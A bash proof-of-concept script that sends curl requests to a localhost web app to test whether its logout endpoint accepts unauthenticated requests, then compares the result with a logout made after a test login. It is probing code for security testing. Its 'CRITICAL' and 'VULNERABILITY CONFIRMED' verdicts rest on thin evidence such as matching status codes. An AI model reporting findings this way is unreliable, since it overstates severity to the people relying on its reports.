#!/bin/bash

# POC: Missing Authentication Check on Logout Endpoint
# This script demonstrates that the logout endpoint accepts and processes requests
# from unauthenticated users without requiring authentication verification.

TARGET_URL="http://localhost:80"
LOGOUT_ENDPOINT="${TARGET_URL}/logout"

echo "=== POC: Missing Authentication Check on Logout Endpoint ==="
echo ""

# Test 1: Unauthenticated logout request (no session cookie)
echo "[*] Test 1: Unauthenticated logout request (no Cookie header)"
echo "[*] Request: curl -i '${LOGOUT_ENDPOINT}' (no authentication)"
echo ""

RESPONSE=$(curl -s -i "${LOGOUT_ENDPOINT}" 2>&1)
echo "$RESPONSE"
echo ""

# Extract status code
STATUS_CODE=$(echo "$RESPONSE" | head -n1 | awk '{print $2}')
echo "[*] Response Status Code: ${STATUS_CODE}"
echo ""

# Check for Set-Cookie header (indicates server is processing logout)
if echo "$RESPONSE" | grep -q "Set-Cookie"; then
    echo "[+] VULNERABLE: Server processed logout request from unauthenticated user"
    echo "[+] Set-Cookie header found - session cookie cleared by server"
    echo "$RESPONSE" | grep "Set-Cookie"
    echo ""
fi

# Test 2: Compare with authenticated logout for consistency
echo "[*] Test 2: Authenticated logout for comparison"
echo "[*] First, obtaining valid session via login..."
echo ""

# Login to get a valid session
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -d "username=test&password=test" "${TARGET_URL}/login" 2>&1)

# Verify login was successful
if grep -q "session=" /tmp/cookies.txt 2>/dev/null; then
    echo "[+] Successfully obtained session cookie"
    
    # Now logout as authenticated user
    echo "[*] Request: curl -i -b cookies.txt '${LOGOUT_ENDPOINT}' (with authentication)"
    echo ""
    
    AUTH_LOGOUT=$(curl -s -i -b /tmp/cookies.txt "${LOGOUT_ENDPOINT}" 2>&1)
    echo "$AUTH_LOGOUT"
    echo ""
    
    AUTH_STATUS=$(echo "$AUTH_LOGOUT" | head -n1 | awk '{print $2}')
    echo "[*] Authenticated Logout Status Code: ${AUTH_STATUS}"
    echo ""
    
    # Compare responses
    echo "[*] Test 3: Comparison Analysis"
    if [ "$STATUS_CODE" = "$AUTH_STATUS" ]; then
        echo "[+] CRITICAL: Both unauthenticated and authenticated logouts return the same status code"
        echo "[+] The endpoint processes requests identically regardless of authentication state"
        echo "[+] This confirms missing authentication check on logout endpoint"
    fi
else
    echo "[-] Could not obtain session cookie (login may have failed)"
fi

echo ""
echo "[*] POC Complete"
echo "[+] VULNERABILITY CONFIRMED: Logout endpoint does not verify user authentication"